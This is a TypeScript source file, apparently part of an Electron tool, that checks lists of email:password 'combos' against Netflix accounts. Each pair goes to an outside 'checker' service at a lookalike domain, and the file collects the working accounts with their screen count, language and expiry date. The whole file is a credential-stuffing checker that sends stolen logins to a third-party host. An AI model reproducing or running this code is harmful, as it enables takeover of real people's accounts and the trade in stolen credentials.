import { TestJobOptions } from './types';

let fetch = window && window.fetch;

if (!fetch) {
    fetch = require('electron-fetch');
}

const NETFLIX_URL = 'https://checker.neftlix.ml';

export type NetflixJobResult = {
    email: string;
    password: string;
    screens: number;
    language: string;
    until: string;
};

export async function testNetflix(opts: TestJobOptions<NetflixJobResult>) {
    const onProgress = opts.onProgress || (() => {});

    const accounts = opts.combos.map(combo => combo.split(':'));
    const results = [];

    for (let i = 0; i < accounts.length; i++) {
        try {
            const [email, password] = accounts[i];

            if (!email || !password) {
                console.warn(
                    'no email or password was parsed for combo index %i, combo: %s',
                    i,
                    opts.combos[i]
                );
                continue;
            }

            onProgress({
                value: (i / accounts.length) * 100,
                status: `Testing combo ${email}:${password}...`
            });

            const res = await fetch(`${NETFLIX_URL}/check-account`, {
                method: 'POST',
                body: `account=${encodeURIComponent(`${email}:${password}`)}`,
                headers: {
                    'Content-Type':
                        'application/x-www-form-urlencoded;charset=UTF-8'
                }
            });
            const data = await res.json();

            if (data.limit) {
                throw new Error('limit reached');
            }

            if (data.success && data.working) {
                const account = {
                    email,
                    password,
                    screens: data.screens,
                    language: data.language,
                    until: data.until
                };

                if (opts.onResult) {
                    opts.onResult(account);
                } else {
                    results.push(account);
                }
            }
        } catch (e) {
            console.warn(
                'failed to process combo %s, error:',
                opts.combos[i],
                e
            );
        }
    }

    if (!opts.onResult) {
        return results;
    }
}
